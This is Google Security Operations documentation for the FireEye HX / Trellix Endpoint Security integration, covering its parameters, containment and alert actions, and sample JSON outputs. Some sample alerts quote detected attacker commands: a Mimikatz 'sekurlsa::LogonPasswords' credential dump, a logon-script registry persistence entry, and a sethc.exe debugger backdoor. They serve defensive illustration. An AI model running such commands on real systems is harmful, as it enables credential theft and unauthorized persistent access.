---
url: https://docs.cloud.google.com/chronicle/docs/soar/marketplace-integrations/fireeye-hx/
title: FireEye HX \u00a0|\u00a0 Google Security Operations \u00a0|\u00a0 Google Cloud Documentation
method: scrapling+scrapegraph
fetched_at: 2026-10-22T05:46:48.641661+00:00
---

# FireEye HX  |  Google Security Operations  |  Google Cloud Documentation

> Source: https://docs.cloud.google.com/chronicle/docs/soar/marketplace-integrations/fireeye-hx/

  * [ Home ](https://docs.cloud.google.com/)
  * [ Documentation ](https://docs.cloud.google.com/docs)
  * [ Security ](https://docs.cloud.google.com/docs/security)
  * [ Google Security Operations ](https://docs.cloud.google.com/chronicle/docs)
  * [ Reference ](https://docs.cloud.google.com/chronicle/docs/reference/google-secops-api-libraries-overview)



Send feedback  Stay organized with collections  Save and categorize content based on your preferences. 

# FireEye HX

**Important:** FireEye and McAfee Enterprise merged and became Trellix. FireEye HX was renamed to Trellix Endpoint Security (HX).

This document describes how to integrate FireEye HX with Google Security Operations.

## Configure FireEye HX integration in Google Security Operations

For detailed instructions on how to configure an integration in Google SecOps, see [Configure integrations](https://docs.cloud.google.com/chronicle/docs/soar/respond/integrations-setup/configure-integrations).

### Integration parameters

Use the following parameters to configure the integration:

Parameter Display Name | Type | Default Value | Is Mandatory | Description  
---|---|---|---|---  
Instance Name | String | N/A | No | Name of the Instance you intend to configure integration for.  
Description | String | N/A | No | Description of the Instance.  
Server | String | https://x.x.x.x:<port> | Yes | Address of the Trellix Endpoint Security instance.  
Username | String | N/A | Yes | The email address of the user which should be used to connect to Trellix Endpoint Security.  
Password | Password | N/A | Yes | The password of the according user.  
Verify SSL | Checkbox | Checked | Yes | Use this checkbox, if your Trellix Endpoint Security connection requires an SSL verification (checked by default).  
Run Remotely | Checkbox | Unchecked | No | Check the field in order to run the configured integration remotely. Once checked, the option appears to select the remote user (agent).  
**Note:** You can make changes at a later stage if needed. Once configured, the Instances can be used in Playbooks. For detailed information on configuring and supporting multiple instances, please see [Supporting multiple instances](https://docs.cloud.google.com/chronicle/docs/soar/respond/integrations-setup/supporting-multiple-instances).

## Actions

### Cancel Host Contain

Use the **Cancel Host Contain** action to remove a host from containment on the Trellix Endpoint Security server based on the Google SecOps IP Address or Hostname entities.

**Note:** This action is not supported for Linux hosts in FireEye HX.

#### Action inputs

The **Cancel Host Contain** action requires the following parameters:

Parameter | Description  
---|---  
`Agent Id` | _Optional_ Agent ID of the host to remove from containment. If not provided, the action attempts to resolve the Agent ID from attached Hostname or Address entities.  
  
#### Action outputs

The **Cancel Host Contain** action provides the following outputs:

Action output type | Availability  
---|---  
Case wall attachment | Not available  
Case wall link | Not available  
Case wall table | Not available  
Enrichment table | Not available  
JSON result | Not available  
Script result | Available  
  
##### Script result

The following table lists the value for the script result output when using the **Cancel Host Contain** action:

Script result name | Value  
---|---  
`is_success` | `true` or `false`  
  
##### Action output messages

The **Cancel Host Contain** action provides the following output messages:

Output message | Message description  
---|---  
`Successfully requested to cancel host containment.` | Action succeeded.  
`Error executing action "Cancel Host Contain". Reason: ERROR_REASON` | Action failed. Check connection to the server, input parameters, or credentials.  
  
### Check Containment Status

Use the **Check Containment Status** action to check the containment status of a host in Trellix Endpoint Security.

#### Action inputs

The **Check Containment Status** action requires the following parameters:

Parameter | Description  
---|---  
`Agent Id` | _Optional_ Agent ID of the host to check containment status for. If not provided, the action attempts to resolve the Agent ID from attached Hostname or IP Address entities.  
  
#### Action outputs

The **Check Containment Status** action provides the following outputs:

Action output type | Availability  
---|---  
Case wall attachment | Not available  
Case wall link | Not available  
Case wall table | Not available  
Enrichment table | Not available  
JSON result | Available  
Script result | Available  
  
##### JSON result

The following example shows the JSON result output received when using the **Check Containment Status** action:
    
    
    {
      "operation_results": {
        "agent-123": {
          "operation": "containment_status",
          "result": "success",
          "status": "contained",
          "reason": null
        }
      },
      "device_metadata": {}
    }
    

##### Script result

The following table lists the value for the script result output when using the **Check Containment Status** action:

Script result name | Value  
---|---  
`is_success` | `true` or `false`  
  
##### Action output messages

The **Check Containment Status** action provides the following output messages:

Output message | Message description  
---|---  
`Successfully checked containment status for specified host.` | Action succeeded.  
`Error executing action "Check Containment Status". Reason: ERROR_REASON` | Action failed. Check connection to the server, input parameters, or credentials.  
  
### Contain Host

#### Description

Create contain host task on the Trellix Endpoint Security server based on the Google SecOps IP or host Google SecOps entities.

**Note:** The action is not supported for Linux hosts by Fireye HX.

#### Parameters

Parameter | Type | Default Value | Is Mandatory | Description  
---|---|---|---|---  
Agent Id | String | N/A | No | Agent ID of the host to contain. If not provided, the action will attempt to resolve the Agent ID from the attached Hostname or Address entities.  
Approve Containment | Checkbox | Unchecked | Yes | Specify if a containment request for the host should be automatically approved to create a contain host task on the Trellix Endpoint Security server. If it's not approved automatically, a containment request can be approved in Trellix Endpoint Security web console.  
  
#### Run On

This action runs on the following entities:

  * IP Address
  * Hostname



#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    N/A
    

### Get Alerts

#### Description

Get Trellix Endpoint Security alerts based on the provided Google SecOps entity and search conditions. The action works on the host or IP Google SecOps entities.

#### Parameters

Parameter Display Name | Type | Default Value | Is Mandatory | Description  
---|---|---|---|---  
Limit | Integer | N/A | No | How many alerts the action should return for example, 100.  
Has Share Mode | Drop Down List _(default = any)_ | _default = any_ | No | Filter alerts that were triggered from indicators with specific share mode. _Available values: any, restricted and, unrestricted._  
Alert Resolution Status | Drop Down List _(default = any)_ | _default = any_ | No | Filter alerts based on alert resolution status. Available values: _any, active_threat, alert, block, partial_block._  
Alert Reported in Last x Hours | Integer | N/A | No | Filter alerts reported in the last x hours, for example, last 4 hours.  
Alert Source | Drop Down List _(default = any)_ | _default = any_ | No | Source of alert. Available values: any, exd (exploit detection), mal (malware alert), ioc (indicator of compromise).  
Condition ID | String | N/A | No | Filter alerts by a specific condition identifier.  
Alert ID | String | N/A | No | Return a specific alert by the alert identifier.  
  
#### Run On

This action runs on the following entities:

  * IP Address
  * Hostname



#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    [
        {
            "EntityResult": [{
                "indicator": {
                    "category": "Mandiant",
                    "display_name": "MIMIKATZ SUSPICIOUS PROCESS ARGUMENTS (METHODOLOGY)",
                    "name": "MIMIKATZ SUSPICIOUS PROCESS ARGUMENTS (METHODOLOGY)",
                    "url": "/hx/api/v3/indicators/mandiant/b7eae353_be50_44cf_8773_7067e9c66d7b",
                    "signature": null,
                    "_id": "b7eae353-be50-44cf-8773-7067e9c66d7b",
                    "uri_name": "b7eae353-be50-44cf-8773-7067e9c66d7b"
                },
                "event_id": 12880,
                "event_values": {
                    "processEvent/processCmdLine": "at  13:00 \\\"C:\\\\TMP\\\\mim.exe sekurlsa::LogonPasswords > C:\\\\TMP\\\\o.txt\\\"",
                    "processEvent/parentPid": 4832,
                    "processEvent/md5": "e2a9c62b47f64525f7eb0cb8d637ff90",
                    "processEvent/processPath": "C:\\\\Windows\\\\System32\\\\at.exe",
                    "processEvent/parentProcess": "cmd.exe",
                    "processEvent/timestamp": "2020-05-29T10:21:03.419Z",
                    "processEvent/startTime": "2020-05-29T10:21:03.419Z",
                    "processEvent/process": "at.exe",
                    "processEvent/username": "DOMAIN-COM\\\\Administrator",
                    "processEvent/pid": 7332,
                    "processEvent/parentProcessPath": "C:\\\\Windows\\\\System32\\\\cmd.exe",
                    "processEvent/eventType": "start"
                },
                "event_type": "processEvent",
                "subtype": null,
                "reported_at": "2020-05-29T10:24:05.410Z",
                "decorators": [],
                "md5values": ["e2a9c62b47f64525f7eb0cb8d637ff90"],
                "appliance": {
                    "_id": "86B7F11ACF8D"
                },
                "agent": {
                    "url": "/hx/api/v3/hosts/FqNP4ybCdrlfVqG3lrCvRP",
                    "_id": "FqNP4ybCdrlfVqG3lrCvRP",
                    "containment_state": "normal"
                },
                "is_false_positive": false,
                "event_at": "2020-05-29T10:21:03.419Z",
                "source": "IOC",
                "matched_at": "2020-05-29T10:23:22.000Z",
                "decorator_statuses": [],
                "url": "/hx/api/v3/alerts/88",
                "_id": 88,
                "resolution": "ALERT",
                "condition": {
                    "url": "/hx/api/v3/conditions/yirelRwhiuXlF0bQhTL4GA==",
                    "_id": "yirelRwhiuXlF0bQhTL4GA=="
                },
                "matched_source_alerts": []
            }],
            "Entity": "PC-01"
        }
    ]
    

### Get Alert Group Details

#### Description

Get full alert group details for provided Alert Group by its ID.

#### Parameters

Parameter Display Name | Type | Default Value | Is Mandatory | Description  
---|---|---|---|---  
Alert Groups ID | String | N/A | Yes | Specify a comma-separated list of Alert Group IDs for which you want to retrieve details.  
  
#### Run On

This action doesn't run on entities, it has a mandatory input parameter.

#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    {
        "details": [],
        "route": "/hx/api/v3/alert_groups/id",
        "data": {
            "_id": "622d3688031aa40faa4bd86028841276",
            "assessment": "[Process reg.exe started] MIMIKATZ SUSPICIOUS PROCESS ARGUMENTS (METHODOLOGY)",
            "file_full_path": "C:\\Windows\\System32\\reg.exe",
            "first_event_at": "2020-08-06T06:32:55.761Z",
            "last_event_at": "2020-08-06T06:32:55.761Z",
            "dispositions": [],
            "source": "IOC",
            "has_fp_disposition": false,
            "last_alert": {
                "_id": 729,
                "agent": {
                    "_id": "QKQ0SinOZUbehz5AgFXQhX",
                    "url": "/hx/api/v3/hosts/QKQ0SinOZUbehz5AgFXQhX",
                    "hostname": "HW-HOST-024",
                    "containment_state": "normal"
                },
                "condition": {
                    "_id": "yirelRwhiuXlF0bQhTL4GA==",
                    "url": "/hx/api/v3/conditions/yirelRwhiuXlF0bQhTL4GA=="
                },
                "event_at": "2020-08-06T06:32:55.761+00:00",
                "matched_at": "2020-08-06T06:37:55+00:00",
                "reported_at": "2020-12-18T14:03:18.856+00:00",
                "source": "IOC",
                "resolution": "ALERT",
                "decorators": [],
                "md5values": [
                    "05cf3ce225b05b669e3118092f4c8eab"
                ],
                "decorator_sources": [],
                "decorator_statuses": [],
                "url": "/hx/api/v3/alerts/729",
                "event_id": 207,
                "event_type": "processEvent",
                "event_values": {
                    "processEvent/timestamp": "2020-08-06T06:32:55.761Z",
                    "processEvent/eventType": "start",
                    "processEvent/pid": 10356,
                    "processEvent/processPath": "C:\\Windows\\System32\\reg.exe",
                    "processEvent/process": "reg.exe",
                    "processEvent/parentPid": 9456,
                    "processEvent/parentProcessPath": "C:\\Windows\\System32\\cmd.exe",
                    "processEvent/parentProcess": "cmd.exe",
                    "processEvent/username": "FIREEYE-LAB\\Administrator",
                    "processEvent/startTime": "2020-08-06T06:32:55.761Z",
                    "processEvent/md5": "05cf3ce225b05b669e3118092f4c8eab",
                    "processEvent/processCmdLine": "REG  ADD HKCU\\Environment /f /v UserInitMprLogonScript /t REG_MULTI_SZ /d \"C:\\TMP\\mim.exe sekurlsa::LogonPasswords > C:\\TMP\\o.txt\""
                },
                "is_false_positive": false
            },
            "generic_alert_badge": null,
            "generic_alert_label": null,
            "stats": {
                "events": 1
            },
            "url": "/hx/api/v3/alert_groups/622d3688031aa40faa4bd86028841276",
            "created_at": "2020-12-18T14:03:24.535Z",
            "acknowledgement": {
                "acknowledged": false,
                "acknowledged_by": null,
                "acknowledged_time": null,
                "comment": null,
                "comment_update_time": null
            },
            "grouped_by": {
                "condition_id": "yirelRwhiuXlF0bQhTL4GA==",
                "detected_by": "ioc_engine",
                "host": {
                    "_id": "QKQ0SinOZUbehz5AgFXQhX",
                    "url": "/hx/api/v3/hosts/QKQ0SinOZUbehz5AgFXQhX",
                    "hostname": "HW-HOST-024",
                    "primary_ip_address": "172.30.202.55"
                }
            }
        },
        "message": "OK"
    }
    

##### Case Wall

Result type | Value/Description | Type  
---|---|---  
Output message* | **Success for 1 (is_success=true):** __Successfully retrieved details about the following alert groups in Trellix Endpoint Security: {alert group ids}**Unsuccess for 1 (is_success=true):** Action wasn't able to retrieve details about the following alert groups in Trellix Endpoint Security: {alert group ids}**Unsuccess for all (is_success=false):** None of the provided alert groups were found in Trellix Endpoint Security. | General  
Case Wall | **Name:** Alert Group Details****  
**Column:**

  * Assessment
  * Alert Group ID
  * First Event
  * Last Event 
  * Acknowledged 
  * Last Alert HX ID 

| General  
  
### Get Alerts in Alert Group

#### Description

Get all the alerts found in the specified alert group

#### Parameters

Parameter Display Name | Type | Default Value | Is Mandatory | Description  
---|---|---|---|---  
Alert Group ID | String | N/A | Yes | Specify a comma-separated list of Alert Group IDs for which you want to retrieve details.  
Limit | Integer | 50 | No | Specify the maximum amount of alerts listings coming back from the API, for the alert group. Default is 50.  
  
#### Run On

This action doesn't run on entities, it has a mandatory input parameter.

#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    {
        "data": {
            "total": 2,
            "query": {},
            "sort": {},
            "offset": 0,
            "limit": 50,
            "entries": [
                {
                    "_id": 712,
                    "agent": {
                        "_id": "9GJe9n4Ynd5dFtZ8wCjIu7",
                        "url": "/hx/api/v3/hosts/9GJe9n4Ynd5dFtZ8wCjIu7",
                        "containment_state": "normal"
                    },
                    "condition": {
                        "_id": "2npvcLf_arxPaH717hQZ9g==",
                        "url": "/hx/api/v3/conditions/2npvcLf_arxPaH717hQZ9g=="
                    },
                    "indicator": {
                        "_id": "f0e49db2-1c28-4529-a426-73251d92de7d",
                        "url": "/hx/api/v3/indicators/mandiant/f0e49db2_1c28_4529_a426_73251d92de7d",
                        "name": "EASE OF ACCESS BACKDOORS (METHODOLOGY)",
                        "uri_name": "f0e49db2-1c28-4529-a426-73251d92de7d",
                        "display_name": "EASE OF ACCESS BACKDOORS (METHODOLOGY)",
                        "signature": null,
                        "category": "Mandiant"
                    },
                    "event_at": "2020-12-10T08:04:09.521Z",
                    "matched_at": "2020-12-10T08:04:43.000Z",
                    "reported_at": "2020-12-10T08:04:49.607Z",
                    "source": "IOC",
                    "subtype": null,
                    "matched_source_alerts": [],
                    "resolution": "ALERT",
                    "is_false_positive": false,
                    "decorators": [],
                    "md5values": [],
                    "decorator_statuses": [],
                    "url": "/hx/api/v3/alerts/712",
                    "event_id": 853899,
                    "event_type": "regKeyEvent",
                    "event_values": {
                        "regKeyEvent/timestamp": "2020-12-10T08:04:09.521Z",
                        "regKeyEvent/hive": "HKEY_LOCAL_MACHINE\\SOFTWARE",
                        "regKeyEvent/keyPath": "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
                        "regKeyEvent/path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger",
                        "regKeyEvent/eventType": 1,
                        "regKeyEvent/pid": 8800,
                        "regKeyEvent/process": "reg.exe",
                        "regKeyEvent/processPath": "C:\\Windows\\System32",
                        "regKeyEvent/valueName": "Debugger",
                        "regKeyEvent/valueType": "REG_SZ",
                        "regKeyEvent/value": "QwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAAAA=",
                        "regKeyEvent/text": "C:\\Windows\\System32\\cmd.exe",
                        "regKeyEvent/username": "FIREEYE-LAB\\Administrator"
                    },
                    "appliance": {
                        "_id": "86B7F11ACF8D"
                    }
                },
                {
                    "_id": 723,
                    "agent": {
                        "_id": "9GJe9n4Ynd5dFtZ8wCjIu7",
                        "url": "/hx/api/v3/hosts/9GJe9n4Ynd5dFtZ8wCjIu7",
                        "containment_state": "normal"
                    },
                    "condition": {
                        "_id": "2npvcLf_arxPaH717hQZ9g==",
                        "url": "/hx/api/v3/conditions/2npvcLf_arxPaH717hQZ9g=="
                    },
                    "indicator": {
                        "_id": "f0e49db2-1c28-4529-a426-73251d92de7d",
                        "url": "/hx/api/v3/indicators/mandiant/f0e49db2_1c28_4529_a426_73251d92de7d",
                        "name": "EASE OF ACCESS BACKDOORS (METHODOLOGY)",
                        "uri_name": "f0e49db2-1c28-4529-a426-73251d92de7d",
                        "display_name": "EASE OF ACCESS BACKDOORS (METHODOLOGY)",
                        "signature": null,
                        "category": "Mandiant"
                    },
                    "event_at": "2020-12-10T09:26:14.114Z",
                    "matched_at": "2020-12-10T09:26:56.000Z",
                    "reported_at": "2020-12-10T09:27:08.735Z",
                    "source": "IOC",
                    "subtype": null,
                    "matched_source_alerts": [],
                    "resolution": "ALERT",
                    "is_false_positive": false,
                    "decorators": [],
                    "md5values": [],
                    "decorator_statuses": [],
                    "url": "/hx/api/v3/alerts/723",
                    "event_id": 880771,
                    "event_type": "regKeyEvent",
                    "event_values": {
                        "regKeyEvent/timestamp": "2020-12-10T09:26:14.114Z",
                        "regKeyEvent/hive": "HKEY_LOCAL_MACHINE\\SOFTWARE",
                        "regKeyEvent/keyPath": "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
                        "regKeyEvent/path": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger",
                        "regKeyEvent/eventType": 1,
                        "regKeyEvent/pid": 8740,
                        "regKeyEvent/process": "reg.exe",
                        "regKeyEvent/processPath": "C:\\Windows\\System32",
                        "regKeyEvent/valueName": "Debugger",
                        "regKeyEvent/valueType": "REG_SZ",
                        "regKeyEvent/value": "QwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAAAA=",
                        "regKeyEvent/text": "C:\\Windows\\System32\\cmd.exe",
                        "regKeyEvent/username": "FIREEYE-LAB\\Administrator"
                    },
                    "appliance": {
                        "_id": "86B7F11ACF8D"
                    }
                }
            ]
        },
        "message": "OK",
        "details": [],
        "route": "/hx/api/v3/alert_groups/group_id/alerts"
    }
    

##### Case Wall

Result type | Value/Description | Type  
---|---|---  
Output message* | **Success for 1 (is_success=true):** Successfully retrieved details about the following alert groups in Trellix Endpoint Security: {alert group ids}**Unsuccess for 1 (is_success=true):** Action wasn't able to retrieve details about the following alert groups in Trellix Endpoint Security: {alert group ids}**Unsuccess for all (is_success=false):** None of the provided alert groups were found in Trellix Endpoint Security. | General  
Case Wall | **Name:** "Trellix Endpoint Security Alert Group +{alert_group_id) Alerts"****  
**Column:**

  * Alert Trellix Endpoint Security ID 
  * Indicator Name
  * Event Time 
  * Matched Time 
  * Reported Time 
  * Source 
  * Event Type 

| General  
  
### Get File

Use the **Get File** action to create a file acquisition task on a FireEye HX host.

#### Action inputs

The **Get File** action requires the following parameters:

Parameter | Description  
---|---  
`Agent Id` | _Optional_ Agent ID of the host to acquire the file from. If not provided, the action attempts to resolve the Agent ID from attached Hostname or IP Address entities.  
`File Path` | _Mandatory_ Full path of the file to acquire on the target endpoint (for example, `C:\Windows\System32\notepad.exe` or `/tmp/malware.sh`).  
`Use API Mode` | _Optional_ If selected, file acquisition uses OS file system APIs instead of raw disk reads. Required for Linux endpoints. Not selected by default.  
`External Id` | _Optional_ Custom external identifier to associate with the file acquisition task.  
  
#### Action outputs

The **Get File** action provides the following outputs:

Action output type | Availability  
---|---  
Case wall attachment | Not available  
Case wall link | Not available  
Case wall table | Not available  
Enrichment table | Not available  
JSON result | Available  
Script result | Available  
  
##### JSON result

The following example shows the JSON result output received when using the **Get File** action:
    
    
    {
      "agent_id": "KE7IdyTFl9fcUyHoPVKOWe",
      "file_name": "notepad.exe",
      "file_path": "C:\\windows\\system32",
      "acquisition_id": 14,
      "_id": 14,
      "_revision": "20241031012314519770835082",
      "error_message": null,
      "comment": null,
      "state": "COMPLETE",
      "md5": "c5b188ac73d5dca677cf5712f65de5af",
      "zip_file_size": "178427",
      "request_time": "2024-10-31T01:21:50Z",
      "request_actor": {
        "_id": 1011,
        "username": "md_services"
      },
      "req_path": "C:\\windows\\system32",
      "req_filename": "notepad.exe",
      "req_multifile_parameters": {
        "isMultiFile": false
      },
      "req_use_api": false,
      "zip_passphrase": "unzip-me",
      "external_id": "File Acquisition Alert_ee345c69-5b84-4b7a-81a4-ea205fc5cd51",
      "finish_time": "2024-10-31T01:23:14.519Z",
      "indicator": null,
      "url": "/hx/api/v3/acqs/files/14",
      "host": {
        "_id": "KE7IdyTFl9fcUyHoPVKOWe",
        "url": "/hx/api/v3/hosts/KE7IdyTFl9fcUyHoPVKOWe"
      },
      "alert": null,
      "condition": null,
      "download_path": "/tmp/example_acquisition.zip"
    }
    

##### Script result

The following table lists the value for the script result output when using the **Get File** action:

Script result name | Value  
---|---  
`is_success` | `true` or `false`  
  
##### Action output messages

The **Get File** action provides the following output messages:

Output message | Message description  
---|---  
`Successfully acquired file from host.` | Action succeeded.  
`Error executing action "Get File". Reason: ERROR_REASON` | Action failed. Check connection to the server, input parameters, or credentials.  
  
### Get Host Info

#### Description

Enrich Google SecOps Host or IP entities based on the information from the Trellix Endpoint Security.

#### Run On

This action runs on the following entities:

  * IP Address
  * Hostname



#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    [
        {
            "EntityResult": {
                "last_alert": {
                    "url": "/hx/api/v3/alerts/254",
                    "_id": 254
                },
                "domain": "EXAMPLE-COM",
                "last_exploit_block_timestamp": null,
                "containment_state": "normal",
                "timezone": "\\u05e9\\u05e2\\u05d5\\u05df \\u05e7\\u05d9\\u05e5 \\u05d9\\u05e8\\u05d5\\u05e9\\u05dc\\u05d9\\u05dd",
                "gmt_offset_seconds": 10800,
                "initial_agent_checkin": "2020-05-29T10:11:12.022Z",
                "stats": {
                    "alerting_conditions": 10,
                    "exploit_alerts": 0,
                    "acqs": 4,
                    "malware_false_positive_alerts": 0,
                    "alerts": 10,
                    "exploit_blocks": 0,
                    "false_positive_alerts": 0,
                    "malware_cleaned_count": 0,
                    "malware_alerts": 0,
                    "false_positive_alerts_by_source": {},
                    "generic_alerts": 0,
                    "malware_quarantined_count": 0
                },
                "primary_mac": "00-50-56-11-22-33",
                "hostname": "HW-HOST-025",
                "primary_ip_address": "1.1.1.1",
                "last_audit_timestamp": "2020-06-01T09:10:38.752Z",
                "last_alert_timestamp": "2020-06-01T08:02:30.817+00:00",
                "containment_queued": false,
                "sysinfo": {
                    "url": "/hx/api/v3/hosts/FqNP4ybCdrlfVqG3lrCvRP/sysinfo"
                },
                "last_exploit_block": null,
                "reported_clone": false,
                "url": "/hx/api/v3/hosts/FqNP4ybCdrlfVqG3lrCvRP",
                "excluded_from_containment": false,
                "last_poll_timestamp": "2020-06-01T09:10:36.000Z",
                "last_poll_ip": "1.1.1.1",
                "containment_missing_software": false,
                "_id": "FqNP4ybCdrlfVqG3lrCvRP",
                "os": {
                    "kernel_version": null,
                    "platform": "win",
                    "patch_level": null,
                    "bitness": "64-bit",
                    "product_name": "Windows 10 Pro"
                },
                "agent_version": "32.30.0"
            },
            "Entity": "PC-01"
        }
    ]
    

### Get Indicator

#### Description

Get information on a specific Indicator from Trellix Endpoint Security server.

#### Parameters

Parameter Display Name | Type | Default Value | Is Mandatory | Description  
---|---|---|---|---  
Indicator Category | String | N/A | Yes | Specify the indicator category uri_name value. uri_name can be found by running "Get Indicators" action.  
Indicator Name | String | N/A | Yes | Specify indicator uri_name value. uri_name can be found by running "Get Indicators" action.  
  
#### Run On

This action runs on all entities.

#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    {
        "category": {
            "url": "/hx/api/v3/indicator_categories/mandiant_unrestricted",
            "_id": 7,
            "uri_name": "mandiant_unrestricted",
            "name": "Mandiant Unrestricted Intel",
            "share_mode": "unrestricted"
        },
        "display_name": "FIREEYE END2END TEST",
        "description": "IOC used for testing HX appliances and content packages to ensure that things work end to end",
        "create_actor": {
            "username": "mandiant",
            "_id": 3
        },
        "active_since": "2020-05-28T13:08:08.513Z",
        "url": "/hx/api/v3/indicators/mandiant_unrestricted/2b4753b0_9972_477e_ba16_1a7c29058cee",
        "_revision": "20200528130929238120103414",
        "create_text": "General_Windows_unrestricted_2020.05.270833",
        "created_by": "General_Windows_unrestricted_2020.05.270833",
        "update_actor": {
            "username": "mandiant",
            "_id": 3
        },
        "meta": null,
        "signature": null,
        "platforms": ["win\", \"osx\", \"linux"],
        "stats": {
            "source_alerts": 0,
            "alerted_agents": 1,
            "active_conditions": 7
        },
        "_id": "2b4753b0-9972-477e-ba16-1a7c29058cee",
        "uri_name": "2b4753b0-9972-477e-ba16-1a7c29058cee",
        "name": "FIREEYE END2END TEST"
    }
    

### Get Indicators

#### Description

Get information on indicators of compromise (IOC) from Trellix Endpoint Security server based on provided search parameters.

#### Parameters

Parameter Display Name | Type | Default Value | Is Mandatory | Description  
---|---|---|---|---  
Indicator Category | String | N/A | No | The indicator category.  
Search Term | String | N/A | No | The search term can be any name, category, signature, source, or condition value.  
Limit | String | N/A | No | How many indicators action should return, for example, 100.  
Share Mode | Drop Down List _(default = any)_ | _default = any_ | No | Filter indicators based on specific share mode. _Available values: any, restricted, unrestricted._  
Sort by Field | String | N/A | No | Sorts the results by the specified field in ascending order.  
Created by | String | N/A | No | Filter indicators based on author.  
Has associated alerts | Checkbox | N/A | No | Specify if only indicators, which have associated alerts should be returned.  
  
#### Run On

This action runs on all entities.

#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    [
        {
            "category": {
                "url": "/hx/api/v3/indicator_categories/mandiant_unrestricted",
                "_id": 7,
                "uri_name": "mandiant_unrestricted",
                "name": "Mandiant Unrestricted Intel",
                "share_mode": "unrestricted"
            },
            "display_name": "FIREEYE END2END TEST",
            "description": "IOC used for testing HX appliances and content packages to ensure that things work end to end",
            "create_actor": {
                "username": "mandiant",
                "_id": 3
            },
            "active_since": "2020-05-28T13:08:08.513Z",
            "url": "/hx/api/v3/indicators/mandiant_unrestricted/2b4753b0_9972_477e_ba16_1a7c29058cee",
            "_revision": "20200528130929238120103414",
            "create_text": "General_Windows_unrestricted_2020.05.270833",
            "created_by": "General_Windows_unrestricted_2020.05.270833",
            "update_actor": {
                "username": "mandiant",
                "_id": 3
            },
            "meta": null,
            "signature": null,
            "platforms": ["win", "osx", "linux"],
            "stats": {
                "source_alerts": 0,
                "alerted_agents": 1,
                "active_conditions": 7
            },
            "_id": "2b4753b0-9972-477e-ba16-1a7c29058cee",
            "uri_name": "2b4753b0-9972-477e-ba16-1a7c29058cee",
            "name": "FIREEYE END2END TEST"
        }
    ]
    

### Get List of File Acquisitions for Host

#### Description

Get a list of file acquisitions requested for the host from Trellix Endpoint Security server. The action works on host or IP Google SecOps entities.

#### Parameters

Parameter Display Name | Type | Default Value | Is Mandatory | Description  
---|---|---|---|---  
Search Term | String | N/A | No | Searches all file acquisitions for hosts connected to the Trellix Endpoint Security server. The search_term can be any condition value.  
Limit | String | N/A | No | How many records the action should return, for example, 100.  
Filter Field | String | N/A | No | Lists only results with the specified field value, results can be filtered by external correlation identifier (external_id).  
  
#### Run On

This action runs on the following entities:

  * IP Address
  * Hostname



#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    [
        {
            "EntityResult": [{
                "comment": " ",
                "zip_passphrase": "unzip-me",
                "indicator": {
                    "url": null,
                    "_id": "FqNP4ybCdrlfVqG3lrCvRP"
                },
                "request_actor": {
                    "username": "admin",
                    "_id": 1000
                },
                "request_time": "2020-06-01T08:43:14.000Z",
                "finish_time": "2020-06-01T08:46:39.156Z",
                "_revision": "20200601084639156575147403",
                "error_message": "The acquisition completed with issues.",
                "req_use_api": false,
                "alert": {
                    "url": null,
                    "_id": "FqNP4ybCdrlfVqG3lrCvRP"
                },
                "url": "/hx/api/v3/acqs/files/9",
                "state": "COMPLETE",
                "host": {
                    "url": "/hx/api/v3/hosts/FqNP4ybCdrlfVqG3lrCvRP",
                    "_id":
                    "FqNP4ybCdrlfVqG3lrCvRP"
                },
                "req_filename": "reg.exe",
                "req_path": "C:\\\\Windows\\\\System32",
                "_id": 9,
                "external_id": null,
                "condition": {
                    "url": null,
                    "_id": "FqNP4ybCdrlfVqG3lrCvRP"
                },
                "md5": "601bddf7691c5af626a5719f1d7e35f1"
            }],
            "Entity": "PC-01"
        }
    ]
    

### Is Contain Malware Alerts

#### Description

Check if malware alerts are listed for provided Google SecOps Host or IP entities on Trellix Endpoint Security server.

#### Run On

This action runs on the following entities:

  * IP Address
  * Hostname



#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    [
        {
            "EntityResult": {
                "alerting_conditions": 10,
                "exploit_alerts": 0,
                "acqs": 4,
                "malware_false_positive_alerts": 0,
                "alerts": 10,
                "exploit_blocks": 0,
                "false_positive_alerts": 0,
                "malware_cleaned_count": 0,
                "malware_alerts": 0,
                "false_positive_alerts_by_source": {},
                "generic_alerts": 0,
                "malware_quarantined_count": 0
            },
            "Entity": "PC-01"
        }
    ]
    

### Ping

#### Description

Test connectivity to the Trellix Endpoint Security server with parameters provided at the integration configuration page in the Google SecOps Content Hub page.

#### Run On

This action runs on all entities.

#### Action Results

##### Script Result

**Script Result Name** | **Value Options** | **Example**  
---|---|---  
is_success | True/False | is_success:False  
  
##### JSON Result
    
    
    N/A
    

### Acknowledge Alert Groups

#### Description

Acknowledge alert groups handled by Google SecOps to better sync between HX platform and Google SecOps.

